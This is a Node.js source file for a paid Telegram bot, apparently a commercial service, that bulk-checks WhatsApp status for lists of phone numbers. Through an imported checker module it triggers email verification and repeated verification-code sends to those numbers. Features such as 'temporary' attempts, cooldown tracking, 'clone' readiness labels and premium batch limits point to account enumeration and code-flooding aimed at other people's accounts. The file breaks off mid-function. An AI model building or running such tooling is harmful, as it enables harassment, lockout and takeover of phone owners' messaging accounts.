require("dotenv").config();
const dns = require("dns");
if (typeof dns.setDefaultResultOrder === "function") dns.setDefaultResultOrder("ipv4first");
const fs = require("fs");
const crypto = require("crypto");
const { Telegraf } = require("telegraf");
const { Redis } = require("@upstash/redis");
const { checkPhone, triggerEmailVerification, sendVerificationCode, probePhoneMethods } = require("./checker");

const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_IDS = (process.env.ADMIN_IDS || "").split(",").filter(Boolean).map(Number);
const FREE_DAILY_LIMIT = parseInt(process.env.FREE_DAILY_LIMIT || "3", 10);
const PREMIUM_BATCH_LIMIT = parseInt(process.env.PREMIUM_BATCH_LIMIT || "30", 10);
const IS_VERCEL = Boolean(process.env.VERCEL || process.env.VERCEL_ENV);
const CONCURRENCY = parseInt(process.env.CONCURRENCY || (IS_VERCEL ? "4" : "8"), 10);
const CHECK_TIMEOUT_MS = parseInt(process.env.CHECK_TIMEOUT_MS || (IS_VERCEL ? "12000" : "28000"), 10);
const CHECK_RETRIES = parseInt(process.env.CHECK_RETRIES || "2", 10);
const RESULT_CACHE_TTL = parseInt(process.env.RESULT_CACHE_TTL || "60", 10);
const TEMP_BUDGET_MS = parseInt(process.env.TEMP_BUDGET_MS || (IS_VERCEL ? "45000" : "300000"), 10);
const TEMP_MAX_ATTEMPTS = parseInt(process.env.TEMP_MAX_ATTEMPTS || (IS_VERCEL ? "8" : "40"), 10);

if (!BOT_TOKEN) { console.error("BOT_TOKEN missing in .env"); process.exit(1); }
if (!process.env.UPSTASH_REDIS_REST_URL || !process.env.UPSTASH_REDIS_REST_TOKEN) {
  console.error("UPSTASH_REDIS_REST_URL / UPSTASH_REDIS_REST_TOKEN missing in .env");
  process.exit(1);
}

const redis = new Redis({
  url: process.env.UPSTASH_REDIS_REST_URL,
  token: process.env.UPSTASH_REDIS_REST_TOKEN,
  automaticDeserialization: false
});

const PLANS = [
  { id: "p1", days: 1, price: 3000, badge: "ʙʀᴏɴᴢᴇ", icon: "✦", style: "primary" },
  { id: "p3", days: 3, price: 5000, badge: "ʜᴇᴍᴀᴛ", icon: "◈", style: "primary" },
  { id: "p7", days: 7, price: 10000, badge: "ᴘᴏᴘᴜʟᴀʀ", icon: "✧", style: "success" },
  { id: "p15", days: 15, price: 13000, badge: "ᴘʀᴏ ᴠᴀʟᴜᴇ", icon: "◆", style: "primary" },
  { id: "p20", days: 20, price: 25000, badge: "ʟᴏɴɢ ᴘᴀꜱꜱ", icon: "♛", style: "success" }
];

const REWARDS = [
  { pts: 5, days: 1 },
  { pts: 10, days: 3 },
  { pts: 20, days: 7 },
  { pts: 30, days: 15 },
  { pts: 50, days: 20 }
];

const MENU_LABELS = {
  DETECT: "◈  ᴅᴇᴛᴇᴋꜱɪ  ɴᴏᴍᴏʀ",
  EMAIL_FIX: "✦  ᴍᴜɴᴄᴜʟᴋᴀɴ  ᴇᴍᴀɪʟ",
  SEND_CODE: "✧  ᴛᴇᴍᴘᴏʀᴀʀʏ",
  STATUS: "◈  ꜱᴛᴀᴛᴜꜱ  ꜱᴀʏᴀ",
  REFERRAL: "❖  ʀᴇꜰᴇʀᴀʟ",
  PREMIUM: "♛  ʙᴇʟɪ  ᴘʀᴇᴍɪᴜᴍ",
  LEADERBOARD: "♛  ʟᴇᴀᴅᴇʀʙᴏᴀʀᴅ",
  ADMIN: "⚙  ᴀᴅᴍɪɴ  ᴘᴀɴᴇʟ"
};

const ALL_MENU_TEXTS = new Set(Object.values(MENU_LABELS));

const VALID_CC_PREFIXES = new Set([
  "1","7","20","27","30","31","32","33","34","36","39","40","41","43","44","45","46","47","48","49",
  "51","52","53","54","55","56","57","58","60","61","62","63","64","65","66","81","82","84","86","90",
  "91","92","93","94","95","98","211","212","213","216","218","220","221","222","223","224","225","226",
  "227","228","229","230","231","232","233","234","235","236","237","238","239","240","241","242","243",
  "244","245","248","249","250","251","252","253","254","255","256","257","258","260","261","262","263",
  "264","265","266","267","268","269","290","291","297","298","299","350","351","352","353","354","355",
  "356","357","358","359","370","371","372","373","374","375","376","377","378","379","380","381","382",
  "383","385","386","387","389","420","421","423","500","501","502","503","504","505","506","507","508",
  "509","590","591","592","593","595","596","597","598","599","670","673","674","675","676","677","678",
  "679","680","681","682","683","685","686","688","689","690","691","692","850","852","853","855","856",
  "880","886","960","961","962","963","964","965","966","967","968","970","971","972","973","974","975",
  "976","977","992","993","994","995","996","998"
]);

let BOT_USERNAME = "";
const awaitingInput = new Set();
const awaitingEmailInput = new Set();
const awaitingSendInput = new Set();
const adminState = new Map();
const keyboardMsgIds = new Map();
const activeInlineMsg = new Map();
const pendingSendPhone = new Map();
const pendingSendMethod = new Map();
const activeSendJobs = new Map();
const today = () => new Date().toISOString().slice(0, 10);

async function safeAnswerCb(ctx, text, extra) {
  try {
    if (text === undefined || text === null) await ctx.answerCbQuery();
    else if (extra === undefined) await ctx.answerCbQuery(text);
    else await ctx.answerCbQuery(text, extra);
  } catch (_) {}
}

function btn(text, callback_data, style = null) {
  const b = { text, callback_data };
  if (style) b.style = style;
  return b;
}

function urlBtn(text, url, style = null) {
  const b = { text, url };
  if (style) b.style = style;
  return b;
}

function inlineKb(rows) {
  return { reply_markup: { inline_keyboard: rows } };
}

function mainKeyboard(userId) {
  const rows = [
    [{ text: MENU_LABELS.DETECT }, { text: MENU_LABELS.SEND_CODE }],
    [{ text: MENU_LABELS.EMAIL_FIX }],
    [{ text: MENU_LABELS.STATUS }, { text: MENU_LABELS.REFERRAL }],
    [{ text: MENU_LABELS.PREMIUM }, { text: MENU_LABELS.LEADERBOARD }]
  ];
  if (ADMIN_IDS.includes(Number(userId))) {
    rows.push([{ text: MENU_LABELS.ADMIN }]);
  }
  return {
    reply_markup: {
      keyboard: rows,
      resize_keyboard: true,
      is_persistent: true
    }
  };
}

function esc(v) {
  return String(v ?? "")
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

function cleanUsername(u) {
  if (!u) return null;
  const s = String(u).trim().replace(/^@+/, "");
  if (!s || s.toLowerCase() === "null" || s.toLowerCase() === "undefined" || s.toLowerCase() === "none") return null;
  return s;
}

function parseRedisHash(raw) {
  if (!raw) return null;
  if (Array.isArray(raw)) {
    if (raw.length === 0) return null;
    const obj = {};
    for (let i = 0; i < raw.length; i += 2) {
      const k = String(raw[i]);
      const v = raw[i + 1];
      obj[k] = v === null || v === undefined ? "" : String(v);
    }
    return Object.keys(obj).length > 0 ? obj : null;
  }
  if (typeof raw === "object") {
    const keys = Object.keys(raw);
    if (keys.length === 0) return null;
    const obj = {};
    for (const k of keys) {
      const v = raw[k];
      obj[k] = v === null || v === undefined ? "" : String(v);
    }
    return obj;
  }
  return null;
}

function hasValidCountryPrefix(digits) {
  for (let len = 3; len >= 1; len--) {
    const p = digits.slice(0, len);
    if (VALID_CC_PREFIXES.has(p) && digits.length - len >= 4) return true;
  }
  return false;
}

function extractSmartPhoneNumbers(rawInput) {
  const segments = String(rawInput || "").split(/[\r\n,;]+/);
  const extracted = [];
  const seen = new Set();

  const pushNumber = (rawToken) => {
    const hasPlus = rawToken.startsWith("+");
    let digits = rawToken.replace(/\D/g, "");
    if (!hasPlus && digits.startsWith("00") && digits.length >= 9) {
      digits = digits.slice(2);
    }
    if (!hasPlus && digits.startsWith("0") && digits.length >= 9 && digits.length <= 14) {
      digits = "62" + digits.slice(1);
    }
    if (digits.length < 7 || digits.length > 15) return;
    if (!hasValidCountryPrefix(digits)) return;

    const normalized = "+" + digits;
    if (!seen.has(digits)) {
      seen.add(digits);
      extracted.push(normalized);
    }
  };

  for (const seg of segments) {
    let line = seg.trim();
    if (!line) continue;

    const waMatches = [...line.matchAll(/(?:wa\.me\/|whatsapp\.com\/send\?phone=)(\+?[\d\-]{7,18})/gi)];
    if (waMatches.length > 0) {
      for (const m of waMatches) pushNumber(m[1]);
      continue;
    }

    line = line.replace(/[\(\[\{]([^)\]\}]+)[\)\]\}]/g, (full, inner) => {
      const t = inner.trim();
      if (/[a-zA-Z]/.test(t) || /^(199\d|20[0-3]\d)$/.test(t)) return " | ";
      return full;
    });

    line = line.replace(/^\s*(?:no\.?\s*|#\s*)?\d{1,4}\s*[\.\)\:\-]\s*(?=[\+\d])/i, "");

    const candidateRegex = /(?:^|[^\d+])((?:\+|00)?\d(?:[\d\-\.\(\)]|\s(?=[\d\(])){5,}\d)(?=$|[^\d])/g;
    let match;
    while ((match = candidateRegex.exec(line)) !== null) {
      const rawCandidate = match[1].trim();
      let hasPlus = rawCandidate.startsWith("+");
      const spaceParts = rawCandidate.split(/\s+/);
      let accDigits = "";
      for (const part of spaceParts) {
        const partDigits = part.replace(/\D/g, "");
        if (!partDigits) continue;
        if (accDigits.length >= 9) {
          if (/^(199\d|20[0-3]\d)$/.test(partDigits)) {
            break;
          }
          if (partDigits.length >= 8 && accDigits.length + partDigits.length > 15) {
            if (accDigits.length >= 7 && accDigits.length <= 15) {
              pushNumber((hasPlus ? "+" : "") + accDigits);
            }
            accDigits = partDigits;
            hasPlus = false;
            continue;
          }
          if (accDigits.length + partDigits.length > 15) {
            break;
          }
        }
        if (accDigits.length + partDigits.length > 15) break;
        accDigits += partDigits;
      }
      if (accDigits.length >= 7 && accDigits.length <= 15) {
        pushNumber((hasPlus ? "+" : "") + accDigits);
      }
    }
  }

  return extracted;
}

async function getSetting(key, def) {
  const v = await redis.get(`settings:${key}`);
  return v !== null && v !== undefined ? String(v) : def;
}

async function setSetting(key, value) {
  await redis.set(`settings:${key}`, String(value));
}

function normalizeUser(raw, fallbackId = null) {
  const obj = parseRedisHash(raw);
  if (!obj) return null;
  const uid = Number(obj.user_id || fallbackId || 0);
  if (!uid) return null;
  const premRaw = obj.is_premium == null ? "" : String(obj.is_premium);
  const premFlag = premRaw === "1" || premRaw.toLowerCase() === "true";
  return {
    user_id: uid,
    username: cleanUsername(obj.username),
    first_name: obj.first_name || null,
    is_premium: premFlag ? 1 : 0,
    premium_until: obj.premium_until && obj.premium_until.trim() ? obj.premium_until.trim() : null,
    total_detections: Number(obj.total_detections || 0),
    ready_detections: Number(obj.ready_detections || 0),
    email_triggers: Number(obj.email_triggers || 0),
    referral_points: Number(obj.referral_points || 0),
    referral_redeemed_days: Number(obj.referral_redeemed_days || 0),
    referred_by: obj.referred_by ? Number(obj.referred_by) : null,
    referred_at: obj.referred_at || null,
    created_at: obj.created_at || null
  };
}

async function getUser(id) {
  const uid = Number(id);
  const raw = await redis.hgetall(`user:${uid}`);
  const u = normalizeUser(raw, uid);
  const backupExp = await redis.get(`user:premium_until:${uid}`);
  if (u && backupExp && String(backupExp).trim()) {
    u.premium_until = String(backupExp).trim();
  }
  return u;
}

async function ensureUser(id, from = null) {
  const uid = Number(id);
  await redis.sadd("users:all", String(uid));
  const existing = await getUser(uid);
  if (existing) {
    if (from) {
      const name = [from.first_name, from.last_name].filter(Boolean).join(" ").trim();
      const uname = cleanUsername(from.username);
      if (uname !== existing.username || (name || null) !== existing.first_name) {
        await redis.hset(`user:${uid}`, {
          user_id: String(uid),
          username: uname || "",
          first_name: name || ""
        });
        existing.username = uname;
        existing.first_name = name || null;
      }
    }
    return existing;
  }
  const name = from ? [from.first_name, from.last_name].filter(Boolean).join(" ").trim() : "";
  const uname = from ? cleanUsername(from.username) : null;
  await redis.hset(`user:${uid}`, {
    user_id: String(uid),
    username: uname || "",
    first_name: name || "",
    is_premium: "0",
    premium_until: "",
    total_detections: "0",
    ready_detections: "0",
    email_triggers: "0",
    referral_points: "0",
    referral_redeemed_days: "0",
    created_at: new Date().toISOString()
  });
  return getUser(uid);
}

async function getAllUserIds() {
  const idSet = new Set(await redis.smembers("users:all"));
  let cursor = "0";
  do {
    const res = await redis.scan(cursor, { match: "user:*", count: 200 });
    cursor = String(res[0]);
    for (const k of (res[1] || [])) {
      const uid = k.slice(5);
      if (/^\d+$/.test(uid)) idSet.add(uid);
    }
  } while (cursor !== "0");
  return Array.from(idSet);
}

async function incrUserField(id, field, amount) {
  await redis.hincrby(`user:${id}`, field, amount);
}

async function getUsed(id) {
  const v = await redis.get(`usage:${id}:${today()}`);
  return v ? Number(v) : 0;
}

async function addUsed(id, n) {
  const key = `usage:${id}:${today()}`;
  await redis.incrby(key, n);
  await redis.expire(key, 172800);
}

async function getFeatureUsed(id, feature) {
  const v = await redis.get(`usage:${feature}:${id}:${today()}`);
  return v ? Number(v) : 0;
}

async function addFeatureUsed(id, feature, n = 1) {
  const key = `usage:${feature}:${id}:${today()}`;
  await redis.incrby(key, n);
  await redis.expire(key, 172800);
}

const FREE_FEATURE_LIMIT = parseInt(process.env.FREE_FEATURE_LIMIT || process.env.FREE_DAILY_LIMIT || "3", 10);

async function assertFeatureAccess(userId, feature) {
  if (ADMIN_IDS.includes(Number(userId))) return { ok: true, premium: true, remaining: 999 };
  const premium = await isPremiumUser(userId);
  if (premium) return { ok: true, premium: true, remaining: 999 };
  const used = await getFeatureUsed(userId, feature);
  const remaining = FREE_FEATURE_LIMIT - used;
  if (remaining <= 0) {
    return { ok: false, premium: false, remaining: 0, used };
  }
  return { ok: true, premium: false, remaining, used };
}

async function isPremiumUser(id) {
  const uid = Number(id);
  if (ADMIN_IDS.includes(uid)) return true;
  const u = await getUser(uid);
  const untilStr = (u && u.premium_until) || (await redis.get(`user:premium_until:${uid}`));
  if (!untilStr) return false;
  const exp = new Date(String(untilStr)).getTime();
  if (isNaN(exp)) return false;
  if (exp > Date.now()) {
    if (!u || !u.is_premium) {
      await redis.hset(`user:${uid}`, { user_id: String(uid), is_premium: "1", premium_until: String(untilStr) });
    }
    return true;
  }
  if (u && u.is_premium) {
    await redis.hset(`user:${uid}`, { is_premium: "0" });
  }
  await redis.del(`user:premium_until:${uid}`);
  return false;
}

async function addPremiumDays(userId, days) {
  const uid = Number(userId);
  const u = await ensureUser(uid);
  const now = Date.now();
  const curExp = u && u.premium_until ? new Date(u.premium_until).getTime() : 0;
  const base = !isNaN(curExp) && curExp > now ? curExp : now;
  const end = new Date(base + days * 86400000);
  const iso = end.toISOString();
  await redis.hset(`user:${uid}`, {
    user_id: String(uid),
    is_premium: "1",
    premium_until: iso
  });
  await redis.set(`user:premium_until:${uid}`, iso);
  return end;
}

async function removePremiumUser(userId) {
  const uid = Number(userId);
  await ensureUser(uid);
  await redis.hset(`user:${uid}`, {
    user_id: String(uid),
    is_premium: "0",
    premium_until: ""
  });
  await redis.del(`user:premium_until:${uid}`);
}

function formatRp(n) {
  return "ʀᴘ " + String(n).replace(/\B(?=(\d{3})+(?!\d))/g, ".");
}

function formatWIB(iso) {
  if (!iso) return "-";
  let s = String(iso);
  if (!s.includes("T")) s = s.replace(" ", "T") + "Z";
  const d = new Date(s);
  if (isNaN(d.getTime())) return "-";
  const wib = new Date(d.getTime() + 7 * 3600000);
  const months = ["Jan","Feb","Mar","Apr","Mei","Jun","Jul","Agu","Sep","Okt","Nov","Des"];
  const dd = String(wib.getUTCDate()).padStart(2, "0");
  const mm = months[wib.getUTCMonth()];
  const yy = wib.getUTCFullYear();
  const hh = String(wib.getUTCHours()).padStart(2, "0");
  const mi = String(wib.getUTCMinutes()).padStart(2, "0");
  return `${dd} ${mm} ${yy}, ${hh}.${mi} WIB`;
}

function formatCooldown(sec) {
  const s = Math.max(0, Math.floor(Number(sec) || 0));
  if (s === 0) return "0dtk";
  const h = Math.floor(s / 3600);
  const m = Math.floor((s % 3600) / 60);
  const remS = s % 60;
  if (h > 0) {
    return m > 0 ? h + "jam " + m + "mnt" : h + "jam";
  }
  if (m > 0) {
    return remS > 0 ? m + "mnt " + remS + "dtk" : m + "mnt";
  }
  return remS + "dtk";
}
function formatElapsed(sec) {
  const n = Number(sec);
  if (!Number.isFinite(n) || n < 0) return "-";
  if (n < 60) {
    const t = n < 10 ? n.toFixed(1) : String(Math.round(n));
    return t + "s";
  }
  const m = Math.floor(n / 60);
  const s = Math.round(n % 60);
  if (m < 60) return s > 0 ? (m + "m " + s + "s") : (m + "m");
  const h = Math.floor(m / 60);
  const rm = m % 60;
  return rm > 0 ? (h + "j " + rm + "m") : (h + "j");
}


function displayCD(r) {
  if (r.cooldownSeconds > 0) return formatCooldown(r.cooldownSeconds);
  return "ᴄᴏᴏʟᴅᴏᴡɴ";
}

function cloneStatusLabel(r) {
  if (r.cooldownSeconds > 0) {
    return formatCooldown(r.cooldownSeconds);
  }
  if (r.isCooldown) {
    return "ᴄᴏᴏʟᴅᴏᴡɴ";
  }
  return "ꜱɪᴀᴘ";
}

function isDeviceOn(r) {
  if (!r || typeof r !== "object") return false;
  if (typeof r.isDeviceOn === "boolean") return r.isDeviceOn;
  if (typeof r.hasDevice === "boolean") return r.hasDevice;
  if (typeof r.waOld === "boolean") return r.waOld;
  if (typeof r.wa_old === "boolean") return r.wa_old;
  const rawVal = r.deviceStatus ?? r.device ?? r.wa_old ?? (r.raw && (r.raw.wa_old ?? r.raw.has_device));
  if (typeof rawVal === "boolean") return rawVal;
  const s = String(rawVal || "").trim().toUpperCase();
  return s === "ON" || s === "1" || s === "TRUE" || s === "ACTIVE" || s === "REGISTERED" || s === "YES";
}

function deviceBadge(r) {
  return isDeviceOn(r) ? "● ᴏɴ-ᴅᴇᴠɪᴄᴇ" : "○ ᴏꜰꜰ-ᴅᴇᴠɪᴄᴇ";
}

function bar(pct, width = 10) {
  const filled = Math.max(0, Math.min(width, Math.round(width * pct / 100)));
  return "●".repeat(filled) + "○".repeat(width - filled);
}

async function getReferralStats(userId) {
  const u = await getUser(userId);
  const active = await redis.scard(`referrals:active:${userId}`);
  return {
    joined: Number(active) || 0,
    points: (u && u.referral_points) || 0,
    redeemedDays: (u && u.referral_redeemed_days) || 0
  };
}

async function recordReferral(referrerId, referredId) {
  if (!referrerId || referrerId === referredId) return;
  const ref = await redis.get(`referral:by:${referredId}`);
  if (ref) return;
  const referrer = await getUser(referrerId);
  if (!referrer) return;
  await redis.hset(`referral:${referredId}`, {
    referrer_id: String(referrerId),
    status: "pending",
    created_at: new Date().toISOString()
  });
  await redis.set(`referral:by:${referredId}`, String(referrerId));
  await redis.hset(`user:${referredId}`, {
    referred_by: String(referrerId),
    referred_at: new Date().toISOString()
  });
}

async function activateReferral(userId) {
  const referrer = await redis.get(`referral:by:${userId}`);
  if (!referrer) return;
  const refData = parseRedisHash(await redis.hgetall(`referral:${userId}`));
  if (!refData || refData.status === "active") return;
  await redis.hset(`referral:${userId}`, {
    status: "active",
    activated_at: new Date().toISOString()
  });
  await redis.sadd(`referrals:${referrer}`, String(userId));
  await redis.sadd(`referrals:active:${referrer}`, String(userId));
  await redis.hincrby(`user:${referrer}`, "referral_points", 1);
  await redis.zincrby("leaderboard:referrals", 1, String(referrer));
}

async function getLeaderboard() {
  const top = await redis.zrange("leaderboard:ready", 0, 9, { rev: true, withScores: true });
  if (!top || top.length === 0) return [];
  const out = [];
  if (typeof top[0] === "object" && top[0] !== null && "member" in top[0]) {
    for (const item of top) {
      const uid = Number(item.member);
      const score = Number(item.score) || 0;
      if (score <= 0) continue;
      const u = await getUser(uid);
      out.push({ user_id: uid, name: (u && u.first_name) || `ᴜꜱᴇʀ ${uid}`, score });
    }
  } else {
    for (let i = 0; i < top.length; i += 2) {
      const uid = Number(top[i]);
      const score = Number(top[i + 1]) || 0;
      if (score <= 0) continue;
      const u = await getUser(uid);
      out.push({ user_id: uid, name: (u && u.first_name) || `ᴜꜱᴇʀ ${uid}`, score });
    }
  }
  return out;
}

function isNonRetryableState(res) {
  if (!res) return false;
  if (res.success) return true;
  const st = String(res.state || "").toUpperCase();
  const err = String(res.error || "").toLowerCase();
  return st === "INVALID_NUMBER" || err.includes("invalid_phone") || err.includes("length_");
}

function callWithTimeout(fn, ms) {
  let timer;
  const timeoutPromise = new Promise((_, reject) => {
    timer = setTimeout(() => reject(new Error("REQUEST_TIMEOUT")), ms);
  });
  return Promise.race([fn(), timeoutPromise]).finally(() => clearTimeout(timer));
}

async function checkSingleSmart(phone, forceFresh = false) {
  const normKey = phone.replace(/^\+/, "");
  const cacheKey = `cache:check:${normKey}`;
  if (!forceFresh && RESULT_CACHE_TTL > 0) {
    try {
      const cached = await redis.get(cacheKey);
      if (cached) {
        const parsed = typeof cached === "string" ? JSON.parse(cached) : cached;
        if (parsed && parsed.success && parsed.state && parsed.state !== "ERROR" && parsed.state !== "UNKNOWN") {
          return parsed;
        }
      }
    } catch (_) {}
  }

  let lastRes = null;
  const maxAttempts = forceFresh ? CHECK_RETRIES + 1 : CHECK_RETRIES;
  for (let attempt = 0; attempt <= maxAttempts; attempt++) {
    try {
      const timeoutMs = forceFresh
        ? CHECK_TIMEOUT_MS + attempt * 3000
        : CHECK_TIMEOUT_MS;
      const res = await callWithTimeout(() => checkPhone(phone), timeoutMs);
      lastRes = res;
      if (res && res.success && res.state && res.state !== "ERROR" && res.state !== "UNKNOWN") {
        if (RESULT_CACHE_TTL > 0) {
          redis.set(cacheKey, JSON.stringify(res), { ex: RESULT_CACHE_TTL }).catch(() => {});
        }
        return res;
      }
      if (isNonRetryableState(res)) return res;
    } catch (e) {
      lastRes = { success: false, phone, error: e && e.message ? e.message : "TIMEOUT" };
    }
    if (attempt < maxAttempts) {
      const base = forceFresh ? 400 : 80;
      const jitter = Math.floor(Math.random() * 120);
      await new Promise(r => setTimeout(r, base * (attempt + 1) + jitter));
    }
  }
  return lastRes || { success: false, phone, error: "ɢᴀɢᴀʟ ᴍᴇɴɢʜᴜʙᴜɴɢɪ ꜱᴇʀᴠᴇʀ" };
}

async function triggerEmailSingleSmart(phone) {
  let lastRes = null;
  for (let attempt = 0; attempt <= CHECK_RETRIES; attempt++) {
    try {
      const res = await callWithTimeout(() => triggerEmailVerification(phone), CHECK_TIMEOUT_MS);
      lastRes = res;
      if (res && res.success && res.state && res.state !== "ERROR" && res.state !== "UNKNOWN") {
        return res;
      }
      if (isNonRetryableState(res)) return res;
    } catch (e) {
      lastRes = { success: false, phone, error: e && e.message ? e.message : "TIMEOUT" };
    }
    if (attempt < CHECK_RETRIES) {
      const jitter = Math.floor(Math.random() * 60);
      await new Promise(r => setTimeout(r, 60 * (attempt + 1) + jitter));
    }
  }
  return lastRes || { success: false, phone, error: "ɢᴀɢᴀʟ ᴍᴇɴɢʜᴜʙᴜɴɢɪ ꜱᴇʀᴠᴇʀ" };
}

async function checkAll(numbers, onProgress, options = {}) {
  const forceFresh = Boolean(options.forceFresh);
  const results = new Array(numbers.length);
  let idx = 0, done = 0;
  const poolCap = IS_VERCEL ? Math.min(CONCURRENCY, 6) : Math.min(CONCURRENCY, 14);
  let adaptivePool = numbers.length >= 15
    ? Math.min(poolCap, Math.max(1, CONCURRENCY))
    : numbers.length >= 8
      ? Math.min(poolCap, Math.max(1, CONCURRENCY))
      : numbers.length >= 4
        ? Math.min(Math.min(poolCap, 6), Math.max(1, CONCURRENCY))
        : Math.min(Math.max(1, CONCURRENCY), numbers.length);
  if (forceFresh) adaptivePool = Math.max(1, Math.min(adaptivePool, IS_VERCEL ? 3 : 4));

  async function worker(workerId) {
    if (workerId > 0) await new Promise(r => setTimeout(r, workerId * 10));
    while (true) {
      const i = idx++;
      if (i >= numbers.length) return;
      results[i] = await checkSingleSmart(numbers[i], forceFresh);
      done++;
      if (onProgress) await onProgress(done, numbers.length, results);
    }
  }
  const workers = Array.from({ length: Math.max(1, adaptivePool) }, (_, w) => worker(w));
  await Promise.all(workers);
  return results;
}

async function triggerEmailAll(numbers, onProgress) {
  const results = new Array(numbers.length);
  let idx = 0, done = 0;
  const poolCap = IS_VERCEL ? Math.min(CONCURRENCY, 5) : Math.min(CONCURRENCY, 12);
  const adaptivePool = numbers.length >= 15
    ? Math.min(poolCap, Math.max(1, CONCURRENCY))
    : numbers.length >= 8
      ? Math.min(poolCap, Math.max(1, CONCURRENCY))
      : numbers.length >= 4
        ? Math.min(Math.min(poolCap, 5), Math.max(1, CONCURRENCY))
        : Math.min(Math.max(1, CONCURRENCY), numbers.length);

  async function worker(workerId) {
    if (workerId > 0) await new Promise(r => setTimeout(r, workerId * 12));
    while (true) {
      const i = idx++;
      if (i >= numbers.length) return;
      results[i] = await triggerEmailSingleSmart(numbers[i]);
      done++;
      if (onProgress) await onProgress(done, numbers.length, results);
    }
  }
  const workers = Array.from({ length: Math.max(1, adaptivePool) }, (_, w) => worker(w));
  await Promise.all(workers);
  return results;
}

async function clearInlinePanel(ctx, userId) {
  const prevInline = activeInlineMsg.get(userId);
  if (prevInline && prevInline.chatId === ctx.chat.id) {
    ctx.telegram.deleteMessage(prevInline.chatId, prevInline.messageId).catch(() => {});
  }
  activeInlineMsg.delete(userId);
}

async function sendFreshKeyboardPanel(ctx, text) {
  const userId = ctx.from.id;
  const chatId = ctx.chat.id;
  await clearInlinePanel(ctx, userId);
  const oldKbId = keyboardMsgIds.get(userId);
  const sent = await ctx.reply(text, {
    parse_mode: "HTML",
    ...mainKeyboard(userId)
  });
  keyboardMsgIds.set(userId, sent.message_id);
  if (oldKbId && oldKbId !== sent.message_id) {
    ctx.telegram.deleteMessage(chatId, oldKbId).catch(() => {});
  }
  return sent;
}

async function showPlainPanel(ctx, text, deleteUserTap = true) {
  const userId = ctx.from.id;
  const chatId = ctx.chat.id;
  if (deleteUserTap && ctx.message && ctx.message.message_id) {
    ctx.deleteMessage().catch(() => {});
  }
  await clearInlinePanel(ctx, userId);
  const kbId = keyboardMsgIds.get(userId);
  if (kbId) {
    try {
      await ctx.telegram.editMessageText(chatId, kbId, undefined, text, {
        parse_mode: "HTML",
        ...mainKeyboard(userId)
      });
      return;
    } catch (e) {
      if (String(e.message || "").includes("message is not modified")) return;
    }
  }
  const sent = await ctx.reply(text, {
    parse_mode: "HTML",
    ...mainKeyboard(userId)
  });
  keyboardMsgIds.set(userId, sent.message_id);
}

async function safeEditMessage(telegram, chatId, messageId, text, kb) {
  try {
    await telegram.editMessageText(chatId, messageId, undefined, text, {
      parse_mode: "HTML",
      disable_web_page_preview: true,
      ...(kb || {})
    });
    return { ok: true, messageId };
  } catch (e) {
    const msg = String(e && e.message ? e.message : e);
    if (msg.includes("message is not modified")) return { ok: true, messageId };
    if (msg.includes("Too Many Requests") || msg.includes("retry after")) {
      const wait = Number((msg.match(/retry after (\d+)/i) || [])[1] || 2);
      await new Promise(r => setTimeout(r, (wait + 1) * 1000));
      try {
        await telegram.editMessageText(chatId, messageId, undefined, text, {
          parse_mode: "HTML",
          disable_web_page_preview: true,
          ...(kb || {})
        });
        return { ok: true, messageId };
      } catch (e2) {
        const msg2 = String(e2 && e2.message ? e2.message : e2);
        if (msg2.includes("message is not modified")) return { ok: true, messageId };
        return { ok: false, error: msg2 };
      }
    }
    return { ok: false, error: msg };
  }
}

async function showInlinePanel(ctx, text, kb, deleteUserTap = true) {
  const userId = ctx.from.id;
  const chatId = ctx.chat.id;
  if (deleteUserTap && ctx.message && ctx.message.message_id) {
    ctx.deleteMessage().catch(() => {});
  }
  const prevInline = activeInlineMsg.get(userId);
  if (prevInline && prevInline.chatId === chatId) {
    const edited = await safeEditMessage(ctx.telegram, chatId, prevInline.messageId, text, kb);
    if (edited.ok) return;
    ctx.telegram.deleteMessage(chatId, prevInline.messageId).catch(() => {});
    activeInlineMsg.delete(userId);
  }
  const sent = await ctx.reply(text, {
    parse_mode: "HTML",
    disable_web_page_preview: true,
    ...(kb || {})
  });
  activeInlineMsg.set(userId, { chatId, messageId: sent.message_id });
}

async function editInline(ctx, text, kb) {
  const userId = ctx.from.id;
  const chatId = ctx.chat.id;

  if (ctx.callbackQuery && ctx.callbackQuery.message) {
    const mid = ctx.callbackQuery.message.message_id;
    const edited = await safeEditMessage(ctx.telegram, chatId, mid, text, kb);
    if (edited.ok) {
      activeInlineMsg.set(userId, { chatId, messageId: mid });
      return;
    }
  }

  const prev = activeInlineMsg.get(userId);
  if (prev && prev.chatId === chatId) {
    const edited = await safeEditMessage(ctx.telegram, chatId, prev.messageId, text, kb);
    if (edited.ok) return;
    ctx.telegram.deleteMessage(chatId, prev.messageId).catch(() => {});
    activeInlineMsg.delete(userId);
  }

  try {
    const sent = await ctx.reply(text, {
      parse_mode: "HTML",
      disable_web_page_preview: true,
      ...(kb || {})
    });
    activeInlineMsg.set(userId, { chatId, messageId: sent.message_id });
  } catch (_) {}
}

async function buildDashboard(userId, from = null) {
  const uid = Number(userId);
  const u = from ? await ensureUser(uid, from) : await getUser(uid);
  const isOwner = ADMIN_IDS.includes(uid);
  const premium = await isPremiumUser(uid);
  const used = await getUsed(uid);
  const liveName = from ? [from.first_name, from.last_name].filter(Boolean).join(" ").trim() : "";
  const name = esc(liveName || (u && u.first_name) || "ᴛᴀɴᴘᴀ ɴᴀᴍᴀ");
  const rawUser = cleanUsername(from && from.username) || cleanUsername(u && u.username);
  const username = rawUser ? "@" + esc(rawUser) : "-";
  const access = isOwner ? "ᴏᴡɴᴇʀ ᴀᴄᴄᴇss" : (premium ? "ᴘʀᴇᴍɪᴜᴍ ᴀᴄᴄᴇss" : "ꜰʀᴇᴇ ᴀᴄᴄᴇss");
  const level = isOwner ? "ᴏᴡɴᴇʀ" : (premium ? "ᴘʀᴇᴍɪᴜᴍ" : "ꜰʀᴇᴇ");
  const quota = (isOwner || premium)
    ? "ᴛᴀɴᴘᴀ ʙᴀᴛᴀs"
    : `${Math.max(0, FREE_DAILY_LIMIT - used)} / ${FREE_DAILY_LIMIT}`;
  return [
    "✦ META DETECT ✦",
    "ᴀᴅᴠᴀɴᴄᴇᴅ ᴡʜᴀᴛsᴀᴘᴘ ᴛᴇʟᴇᴍᴇᴛʀʏ",
    "",
    `<blockquote>⚙ sᴛᴀᴛᴜs ᴀᴋᴜɴ`,
    `▸ ɴᴀᴍᴀ ⦂ ${name}`,
